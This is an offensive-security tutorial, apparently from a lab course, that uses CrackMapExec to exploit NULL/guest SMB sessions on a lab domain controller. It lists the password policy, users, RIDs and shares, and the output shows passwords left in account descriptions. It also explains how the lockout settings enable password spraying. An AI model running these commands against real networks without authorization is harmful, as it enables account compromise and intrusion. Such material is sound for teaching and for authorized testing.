# Exploiting NULL/Anonymous Sessions

A [NULL Session](https://en.wikipedia.org/wiki/Null_session) is an anonymous connection to an inter-process communication network service on Windows-based computers. The service is designed to allow named pipe connections but may be used by attackers to gather information about the system remotely.

When a target is vulnerable to a `NULL Session`, especially a domain controller, it will allow the attacker to gather information without having a valid domain account, such as:

* Domain users (`--users`)
* Domain groups (`--groups`)
* Password policy (`--pass-pol`)
* Share folders (`--shares`)

Let's try it on a domain controller using the following commands:

### **Enumerating the Password Policy**

```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
```

```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] Dumping password info for domain: INLANEFREIGHT
SMB         10.129.203.121  445    DC01             Minimum password length: 7
SMB         10.129.203.121  445    DC01             Password history length: 24
SMB         10.129.203.121  445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.129.203.121  445    DC01             
SMB         10.129.203.121  445    DC01             Password Complexity Flags: 000001
SMB         10.129.203.121  445    DC01                 Domain Refuse Password Change: 0
SMB         10.129.203.121  445    DC01                 Domain Password Store Cleartext: 0
SMB         10.129.203.121  445    DC01                 Domain Password Lockout Admins: 0
SMB         10.129.203.121  445    DC01                 Domain Password No Clear Change: 0
SMB         10.129.203.121  445    DC01                 Domain Password No Anon Change: 0
SMB         10.129.203.121  445    DC01                 Domain Password Complex: 1
SMB         10.129.203.121  445    DC01             
SMB         10.129.203.121  445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.129.203.121  445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.129.203.121  445    DC01             Locked Account Duration: 30 minutes 
SMB         10.129.203.121  445    DC01             Account Lockout Threshold: None
SMB         10.129.203.121  445    DC01             Forced Log off Time: Not Set
```

If we want to export this list we can use `--export [OUTPUT_FULL_FILE_PATH]`. In the following example we will use `$(pwd)` to use the current path:

#### **Exporting Password Policy**

```shell-session
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol --export $(pwd)/passpol.txt
```

The export will be a JSON file. We can format the file using `sed` to replace single quotes with double quotes and use the `jq` application to display it.

#### **Formating exported file**

```shell-session
al1abb@htb[/htb]$ sed -i "s/'/\"/g" passpol.txt
al1abb@htb[/htb]$ cat passpol.txt | jq
{
  "min_pass_len": 1,
  "pass_hist_len": 24,
  "max_pass_age": "41 days 23 hours 53 minutes ",
  "min_pass_age": "1 day 4 minutes ",
  "pass_prop": "000000",
  "rst_accnt_lock_counter": "30 minutes ",
  "lock_accnt_dur": "30 minutes ",
  "accnt_lock_thres": "None",
  "force_logoff_time": "Not Set"
}
```

### **Enumerating Users**

```
crackmapexec smb 10.129.203.121  -u '' -p '' --users --export $(pwd)/users.txt
```

```
crackmapexec smb 10.129.203.121  -u '' -p '' --users --export $(pwd)/users.txt
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] Error enumerating domain users using dc ip 10.129.203.121: NTLM needs domain\username and a password
SMB         10.129.203.121  445    DC01             [*] Trying with SAMRPC protocol
SMB         10.129.203.121  445    DC01             [+] Enumerated domain user(s)
SMB         10.129.203.121  445    DC01             inlanefreight.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.203.121  445    DC01             inlanefreight.htb\carlos                         
SMB         10.129.203.121  445    DC01             inlanefreight.htb\grace                          
SMB         10.129.203.121  445    DC01             inlanefreight.htb\peter                          
SMB         10.129.203.121  445    DC01             inlanefreight.htb\alina                          Account for testing HR App. Password: HRApp123!
SMB         10.129.203.121  445    DC01             inlanefreight.htb\noemi                          
SMB         10.129.203.121  445    DC01             inlanefreight.htb\engels                         Service Account for testing
SMB         10.129.203.121  445    DC01             inlanefreight.htb\kiosko                         
SMB         10.129.203.121  445    DC01             inlanefreight.htb\testaccount                    pwd: Testing123!
SMB         10.129.203.121  445    DC01             inlanefreight.htb\mathew                         
SMB         10.129.203.121  445    DC01             inlanefreight.htb\svc_mssql
```

We can use the exported file to get a list of all users, we will later use this list

### **Extracting Users List**

```shell-session
al1abb@htb[/htb]$ sed -i "s/'/\"/g" users.txt
al1abb@htb[/htb]$ jq -r '.[]' users.txt > userslist.txt
al1abb@htb[/htb]$ cat userslist.txt
Guest
carlos
grace
peter
alina
noemi
engels
kiosko
testaccount
mathew
svc_mssql
gmsa_adm
belkis
nicole
jorge
linda
shaun
diana
patrick
elieser
```

Here we could list all domain users and the password policy without any account. This configuration is not always present, but this will help us get started on our goal of compromising the domain if it is the case.

## Enumerating Users with rid bruteforce

The `--rid-brute` option can be used to determine the users of a domain. This option is particularly useful when dealing with a domain that has NULL Authentication but has certain query restrictions. By using this option, we can enumerate the users and other objects in the domain.

```shell-session
crackmapexec smb 10.129.204.172  -u '' -p '' --rid-brute
```

```shell-session
$ crackmapexec smb 10.129.204.172  -u '' -p '' --rid-brute
SMB         10.129.204.172  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.204.172  445    DC01             [+] Brute forcing RIDs
SMB         10.129.204.172  445    DC01             498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.204.172  445    DC01             500: INLANEFREIGHT\Administrator (SidTypeUser)
SMB         10.129.204.172  445    DC01             501: INLANEFREIGHT\Guest (SidTypeUser)
SMB         10.129.204.172  445    DC01             502: INLANEFREIGHT\krbtgt (SidTypeUser)
SMB         10.129.204.172  445    DC01             512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB         10.129.204.172  445    DC01             513: INLANEFREIGHT\Domain Users (SidTypeGroup)
...SNIP...
SMB         10.129.204.172  445    DC01             1853: INLANEFREIGHT\abinateps (SidTypeUser)
SMB         10.129.204.172  445    DC01             1854: INLANEFREIGHT\bustoges (SidTypeUser)
SMB         10.129.204.172  445    DC01             1855: INLANEFREIGHT\nobseellace (SidTypeUser)
SMB         10.129.204.172  445    DC01             1856: INLANEFREIGHT\wormithe (SidTypeUser)
SMB         10.129.204.172  445    DC01             1857: INLANEFREIGHT\therbanstook (SidTypeUser)
SMB         10.129.204.172  445    DC01             1858: INLANEFREIGHT\sweend (SidTypeUser)
SMB         10.129.204.172  445    DC01             1859: INLANEFREIGHT\voge1993 (SidTypeUser)
SMB         10.129.204.172  445    DC01             1860: INLANEFREIGHT\lach1973 (SidTypeUser)
SMB         10.129.204.172  445    DC01             1861: INLANEFREIGHT\coulart77 (SidTypeUser)
SMB         10.129.204.172  445    DC01             1862: INLANEFREIGHT\whirds (SidTypeUser)
SMB         10.129.204.172  445    DC01             1863: INLANEFREIGHT\sturhe (SidTypeUser)
SMB         10.129.204.172  445    DC01             1864: INLANEFREIGHT\turittly (SidTypeUser)
```

By default, `--rid-brute` enumerate objects brute forcing RIDs up to `4000`. We can modify its behavior using `--rid-brute [MAX_RID]`.

{% hint style="info" %}
**Note:** There will be scenarios where we can brute force rids with null authentication.
{% endhint %}

## Enumerating Shares

Regarding shared folders, depending on the server configuration, we may be able to access shares by just typing the option `--shares` without any account. If we get an error, we can try using a random name (non-existing account) or guest/anonymous without passwords to list the shared folders.

```shell-session
crackmapexec smb 10.129.203.121 -u '' -p '' --shares
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u '' -p '' --shares
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\: 
SMB         10.129.203.121  445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```shell-session
crackmapexec smb 10.129.203.121 -u guest -p '' --shares
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u guest -p '' --shares
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\guest: 
SMB         10.129.203.121  445    DC01             [+] Enumerated shares
SMB         10.129.203.121  445    DC01             Share           Permissions     Remark
SMB         10.129.203.121  445    DC01             -----           -----------     ------
SMB         10.129.203.121  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.203.121  445    DC01             C$                              Default share
SMB         10.129.203.121  445    DC01             carlos                          
SMB         10.129.203.121  445    DC01             D$                              Default share
SMB         10.129.203.121  445    DC01             david                           
SMB         10.129.203.121  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.203.121  445    DC01             IT                              
SMB         10.129.203.121  445    DC01             john                            
SMB         10.129.203.121  445    DC01             julio                           
SMB         10.129.203.121  445    DC01             linux01         READ,WRITE      
SMB         10.129.203.121  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.203.121  445    DC01             svc_workstations                 
SMB         10.129.203.121  445    DC01             SYSVOL                          Logon server share 
SMB         10.129.203.121  445    DC01             Users           READ
```

The information we collected can be helpful in gaining a foothold in the domain. We can use the information in the password policy to mount a Password Spraying campaign, perform attacks such as ASREPRoasting or potentially gain access to confidential information through an open share folder.

***

## Understanding Password Policy

Microsoft documentation for [Password Policy](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy) provides an overview of password policies for Windows and links to information for each policy setting.

One of the policy settings we see in the output is `Domain Password Complex`, which is set to 1. The [Password must meet complexity requirements](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements) policy setting determines whether passwords must meet a series of strong password guidelines. When enabled, this setting requires passwords to meet the following criteria:

* Passwords may not contain the user's sAMAccountName (user account name) value or entire displayName (full name value). Both checks aren't case-sensitive.
* The password must contain characters from three of the following categories:
  * Uppercase letters of European languages (A through Z, with diacritic marks, Greek and Cyrillic characters)
  * Lowercase letters of European languages (a through z, sharp-s, with diacritic marks, Greek and Cyrillic characters)
  * Base 10 digits (0 through 9)
  * Non-alphanumeric characters (special characters): ``(~!@#$%^&*_-+=`|\(){}[]:;"'<>,.?/)`` Currency symbols such as the Euro or British Pound aren't counted as special characters for this policy setting.
  * Any Unicode character categorized as an alphabetic character but isn't uppercase or lowercase. This group includes Unicode characters from Asian languages.

{% hint style="info" %}
**Note:** Complexity requirements are enforced when passwords are changed or created.
{% endhint %}

Another crucial parameter to enumerate for a password spraying attack is the `Account Lockout Threshold`. This policy setting determines the number of failed sign-in attempts that will cause a user account to be locked. A locked account can't be used until you reset it or until the number of minutes specified by the `Account Lockout Duration` policy setting expires, which is also displayed in CrackMapExec output.

Based on this password policy, there is no lockout policy. We could try as many passwords as we want, and the accounts won't be locked. Based on the policy, the password will have at least seven characters and contain at least one each of an uppercase and lowercase letter and a special character.

{% hint style="info" %}
**Note:** CrackMapExec only checks the Default Password Policy, not Password Setting Objects (PSO), if they exist.
{% endhint %}
